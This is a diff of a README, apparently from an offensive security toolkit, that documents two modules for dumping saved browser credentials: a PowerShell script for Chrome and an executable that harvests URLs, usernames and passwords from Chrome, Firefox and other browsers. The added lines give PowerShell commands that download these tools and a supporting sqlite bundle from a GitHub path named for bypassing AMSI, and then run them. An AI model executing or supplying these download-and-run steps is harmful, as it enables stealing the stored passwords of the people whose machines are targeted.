@@ -1,8 +1,9 @@
 ## Module Name
-   DumpChromePasswords
+   <b><i>DumpChromePasswords.ps1</i></b>
 
-   **Description:**
-   <b><i>This cmdlet dumps URLs, usernames, and passwords from Chrome.</i></b>
+|Cmdlet Name|Description|Privileges
+|---|---|---|
+|DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|
 
    **prerequisites:**
 ``` 
@@ -10,22 +11,32 @@
    2. Your database must be accessible (close Chrome, or make some copy)
    3. It must by your database. If Chrome cannot open it, the script will probably fail as well.
 ```
-   **Syntax:**
-```powershell   
+
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/DumpChromePasswords.ps1" -OutFile "DumpChromePasswords.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip" -OutFile "sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip"
+```
+
+```powershell
 .\DumpChromePasswords.ps1
 ```
 
 <br />
 
+
 ## Module Name
-   HarvestBrowserPasswords
+   <b><i>HarvestBrowserPasswords.exe</i></b>
 
-   **Description:**
-   <b><i>This cmdlet dumps URLs, usernames, and passwords from major browsers.</i></b>
+|Binary Name|Description|Privileges
+|---|---|---|
+|HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|
 
-   **Syntax:**
-```powershell      
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
+```
+
+```powershell
 .\HarvestBrowserPasswords.exe -a, --all
 .\HarvestBrowserPasswords.exe -f, --firefox
 .\HarvestBrowserPasswords.exe -c, --chrome
-```   
+```
